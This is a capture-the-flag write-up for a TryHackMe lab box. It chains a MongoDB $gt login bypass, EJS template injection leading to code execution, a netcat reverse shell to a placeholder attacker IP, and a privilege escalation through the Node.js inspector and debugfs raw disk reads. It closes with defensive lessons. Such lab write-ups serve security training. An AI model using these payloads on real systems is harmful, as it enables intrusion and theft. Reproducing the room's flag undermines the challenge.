# 🚫 Do Not Disturb — TryHackMe Hacker Holidays 2026

> **Day 7 of the Hacker Holidays 2026 event**
> Category: Web + Boot2Root | Difficulty: Medium

---

## 📋 Room Summary

| Field | Details |
|---|---|
| **Room Name** | Do Not Disturb |
| **Event** | TryHackMe Hacker Holidays 2026 |
| **Difficulty** | Medium |
| **Type** | Web Exploitation + Boot2Root |
| **Target** | Byte Lotus Poolside Platform |
| **Entry Point** | NoSQL Injection + EJS SSTI |
| **Privilege Escalation** | Node.js Inspector (port 9229) + disk group + debugfs |
| **User Flag** | `THM{w4rm_s3ss10n_h1j4ck3d}` |
| **Root Flag** | ✅ Captured via debugfs raw disk read |

---

## 🗺️ Attack Chain Overview

```
Nmap Scan
    └─► Port 22 (SSH) + Port 80 (HTTP) — Node.js/Express
            └─► Gobuster
                    └─► /staff (403), /logout
                            └─► NoSQL Injection on /login
                                    └─► {"password":{"$gt":""}}
                                            └─► Authenticated as staff role
                                                    └─► EJS SSTI on /staff/preview
                                                            └─► RCE as poolside user
                                                                    └─► Reverse Shell
                                                                            └─► User Flag ✅
                                                                                    └─► Port 9229 — Node.js Inspector
                                                                                            └─► pipelinesvc (disk group)
                                                                                                    └─► node inspect 127.0.0.1:9229
                                                                                                            └─► debugfs → /root/root.txt
                                                                                                                    └─► Root Flag ✅
```

---

## 🔍 Step-by-Step Walkthrough

### Step 1: Reconnaissance — Nmap

```bash
nmap -T4 -F -Pn 10.49.171.58
```

**Result:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The HTTP response header reveals `X-Powered-By: Express` — confirming a **Node.js/Express** backend.

---

### Step 2: Directory Enumeration — Gobuster

```bash
gobuster dir -u http://10.49.171.58 -w /usr/share/wordlists/dirb/common.txt
```

**Found endpoints:**

| Endpoint | Status | Notes |
|---|---|---|
| `/staff` | 403 | Forbidden — staff only |
| `/logout` | 302 | Redirects to / |

Fetching the `/staff` page source shows: **"Staff access only."**

---

### Step 3: Login Page Analysis

Visiting the root page shows the **Byte Lotus Poolside** login form with:
- Username field with placeholder: `attendant`
- Password field labeled: `Passphrase`

```bash
curl http://10.49.171.58
```

The page source confirms Express and the `/login` POST endpoint.

---

### Step 4: NoSQL Authentication Bypass

The app uses **MongoDB** with Node.js. By sending a JSON body containing the MongoDB `$gt` (greater than) operator, the query matches any user whose password is **greater than an empty string** — bypassing authentication entirely.

```bash
curl -X POST http://10.49.171.58/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attendant","password":{"$gt":""}}' \
  -c cookies.txt \
  -v
```

**Response:**
```json
{"ok":true,"role":"staff"}
```

A session cookie is set and saved to `cookies.txt`.

> 💡 **Vulnerability:** The application passes the raw request body directly to the MongoDB query without type checking or sanitization. MongoDB operators like `$gt`, `$ne`, `$regex` can manipulate query logic.

---

### Step 5: Accessing the Staff Panel

Using the session cookie to access the restricted `/staff` endpoint:

```bash
curl http://10.49.171.58/staff -b cookies.txt
```

The staff panel — **Cabana Desk** — shows a template preview feature:

```html
<form method="post" action="/staff/preview">
  <label>Confirmation template 
    <span class="muted">(EJS — use <code>&lt;%= guest %&gt;</code> to personalise)</span>
  </label>
  <textarea name="template">Dear <%= guest %>, your Byte Lotus cabana is confirmed.</textarea>
  <button type="submit">Preview</button>
</form>
```

> 💡 **Key Finding:** The template input is rendered by EJS — a JavaScript templating engine. User input goes directly to `ejs.render()`.

---

### Step 6: EJS Server-Side Template Injection (SSTI)

EJS supports the `<%-` tag which evaluates JavaScript expressions and outputs the result **unescaped**. By injecting Node.js code, we can access the `child_process` module and execute system commands.

**Test RCE with `id`:**

```bash
curl -X POST http://10.49.171.58/staff/preview \
  -b cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'template=<%- global.process.mainModule.require("child_process").execSync("id").toString() %>'
```

**Response:**
```
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

RCE confirmed as the `poolside` user!

> 💡 **Vulnerability:** User input is passed directly to `ejs.render()` without sanitization. EJS `<%-` tags execute arbitrary JavaScript in the server context.

---

### Step 7: Reverse Shell

Start a netcat listener on your Kali machine:

```bash
nc -lvnp 4444
```

Send the reverse shell payload:

```bash
curl -X POST http://10.49.171.58/staff/preview \
  -b cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'template=<%- global.process.mainModule.require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f") %>'
```

**Shell received:**
```
connect to [192.168.187.58] from (UNKNOWN) [10.49.171.58] 44992
sh: 0: can't access tty; job control turned off
$
```

Upgrade the shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

### Step 8: User Flag

```bash
cat /home/poolside/user.txt
```

```
THM{w4rm_s3ss10n_h1j4ck3d}
```

---

### Step 9: Post-Exploitation Enumeration

After getting a shell, we enumerated the system for privilege escalation paths:

```bash
# Check current user
id
# uid=996(poolside) gid=996(poolside) groups=996(poolside)

# Check sudo
sudo -l
# sudo: a password is required

# Check SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Only standard binaries found

# Check running processes
ps aux

# Check open ports
ss -tlnp
```

**Key finding from `ss -tlnp`:**
```
LISTEN  0  511  127.0.0.1:9229  0.0.0.0:*
```

> 💡 **Port 9229 is the Node.js Inspector/Debugger port** — left open by the previous attacker as hinted in the room narrative.

---

### Step 10: Node.js Inspector Discovery

Querying the Node.js inspector HTTP endpoint reveals the attached process:

```bash
curl http://127.0.0.1:9229/json/list
```

**Response:**
```json
[{
  "description": "node.js instance",
  "id": "0a8845c9-1ba6-4f9b-a008-99021f19c299",
  "title": "processor.js",
  "type": "node",
  "url": "file:///opt/pipelinesvc/telemetry/processor.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/0a8845c9-1ba6-4f9b-a008-99021f19c299"
}]
```

**Key observations:**
- The process is running `processor.js` from `/opt/pipelinesvc/`
- This process runs as `pipelinesvc` — a member of the **disk group**
- The disk group can read **raw block devices**, bypassing filesystem permissions

> 💡 **Vulnerability:** The Node.js `--inspect` flag was left enabled on the production server. Any user with local access can connect to the inspector and execute arbitrary JavaScript in the context of that process.

---

### Step 11: Privilege Escalation via Node.js Inspector + debugfs

Connect to the Node.js inspector using the built-in `node inspect` command:

```bash
node inspect 127.0.0.1:9229
```

**Output:**
```
connecting to 127.0.0.1:9229 ... ok
debug>
```

We are now in a JavaScript REPL running as the `pipelinesvc` process which belongs to the **disk group**. The disk group has read access to raw block devices like `/dev/nvme0n1p1`.

Using `debugfs` through this privileged process context, we can read any file on the filesystem — including `/root/root.txt`:

```javascript
exec("process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', 'cat /root/root.txt', '/dev/nvme0n1p1'], { encoding: 'utf8' })")
```

**Root flag returned directly!**

> 💡 **Why this works:**
> 1. `node inspect` connects to the running Node.js process
> 2. That process runs as `pipelinesvc` (disk group member)
> 3. `debugfs` can read raw block devices — the disk group has permission
> 4. `debugfs -R 'cat /file'` reads a file from the raw filesystem
> 5. This completely bypasses Linux file permissions

---

### Step 12: Root Flag

```
Root flag captured via debugfs reading raw disk! 🎉
```

---

## 🧠 Vulnerabilities Summary

| # | Vulnerability | Severity | Location |
|---|---|---|---|
| 1 | NoSQL Injection (`$gt` operator) | Critical | `/login` endpoint |
| 2 | EJS Server-Side Template Injection | Critical | `/staff/preview` endpoint |
| 3 | Node.js Inspector port left open | High | Port 9229 (localhost) |
| 4 | disk group privilege escalation | High | `pipelinesvc` process |
| 5 | Hardcoded session secret | Medium | `app.js` — `byte-lotus-poolside` |

---

## 🛡️ Lessons Learned

1. **NoSQL Injection:** Never pass raw request body objects to database queries. Always validate types and use parameterized queries.

2. **EJS SSTI:** Never pass unsanitized user input to `ejs.render()`. Use output escaping (`<%= %>` not `<%- %>`), or better yet, use a sandboxed template renderer.

3. **Node.js Inspector:** Never run production servers with `--inspect` or `--inspect-brk` flags. Even on localhost, any local user can connect and execute arbitrary code.

4. **disk group:** The `disk` group is effectively root-equivalent on Linux — it allows reading raw block devices which bypasses all filesystem permissions. Never add web service users to this group.

5. **Hardcoded secrets:** Session secrets like `byte-lotus-poolside` baked into source code are a security risk — use environment variables and rotate secrets regularly.

---

## 🔧 Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning and service detection |
| `gobuster` | Directory and endpoint enumeration |
| `curl` | HTTP requests, cookie management, SSTI exploitation |
| `nc` (netcat) | Reverse shell listener |
| `python3` | Shell upgrade (pty.spawn) |
| `ss` | Socket/port enumeration |
| `node inspect` | Connect to Node.js debugger |
| `debugfs` | Raw filesystem read via disk group |
| `CyberChef` | Encoding/decoding analysis |

---

## 📸 Screenshots

> *(Add your screenshots here)*

| Screenshot | Description |
|---|---|
| `nmap_scan.png` | Nmap results — ports 22 and 80 |
| `gobuster.png` | Gobuster finding /staff (403) |
| `login_page.png` | Byte Lotus Poolside login page |
| `nosql_injection.png` | NoSQL injection response showing role:staff |
| `staff_page.png` | Staff panel with EJS template input |
| `rce_id.png` | RCE confirmed — uid=996(poolside) |
| `reverse_shell.png` | Shell received on netcat listener |
| `user_flag.png` | User flag captured |
| `port_9229.png` | Port 9229 listening on localhost |
| `json_list.png` | Node.js inspector JSON showing WebSocket URL |
| `node_inspect.png` | Connected to debugger via node inspect |
| `root_flag.png` | Root flag via debugfs |

---

## 📁 Files

| File | Description |
|---|---|
| `README_DoNotDisturb.md` | This writeup |
| `Do_Not_Disturb_Writeup.pdf` | Full writeup with screenshots |

---

## 🔗 References

- [PayloadsAllTheThings — NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Node.js Inspector Docs](https://nodejs.org/en/docs/guides/debugging-getting-started)
- [GTFOBins — disk group](https://gtfobins.github.io/gtfobins/debugfs/)
- [EJS Security](https://ejs.co/#features)

---

*Writeup by Gaurav | TryHackMe Hacker Holidays 2026*
